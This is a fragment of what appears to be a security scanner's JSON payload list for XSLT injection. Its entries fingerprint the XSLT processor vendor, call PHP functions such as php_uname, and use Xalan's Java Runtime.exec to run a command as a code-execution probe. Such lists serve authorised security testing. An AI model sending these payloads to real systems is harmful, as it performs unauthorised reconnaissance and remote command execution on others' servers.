        {"payload": "<xsl:value-of select=\"system-property('xsl:vendor-url')\"/>", "description": "XSLT vendor URL fingerprint", "waf_bypass": false},
        {"payload": "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"system-property('xsl:vendor')\"/></xsl:template></xsl:stylesheet>", "description": "Full XSLT stylesheet with vendor probe", "waf_bypass": false},
        {"payload": "<xsl:value-of select=\"php:function('phpversion')\"/>", "description": "PHP function call via XSLT (PHP libxslt)", "waf_bypass": false},
        {"payload": "<xsl:value-of select=\"php:function('php_uname')\"/>", "description": "PHP uname via XSLT for OS fingerprint", "waf_bypass": false},
        {"payload": "<xsl:value-of select=\"runtime:exec(runtime:getRuntime(),'hostname')\" xmlns:runtime=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"/>", "description": "Xalan Java runtime hostname (benign RCE detection)", "waf_bypass": false},
        {"payload": "<xsl:value-of select=\"math:random()\" xmlns:math=\"http://exslt.org/math\"/>", "description": "EXSLT math:random for extension detection", "waf_bypass": false},
        {"payload": "<xsl:value-of select=\"str:tokenize('a,b,c', ',')\" xmlns:str=\"http://exslt.org/strings\"/>", "description": "EXSLT string tokenize for extension detection", "waf_bypass": false}
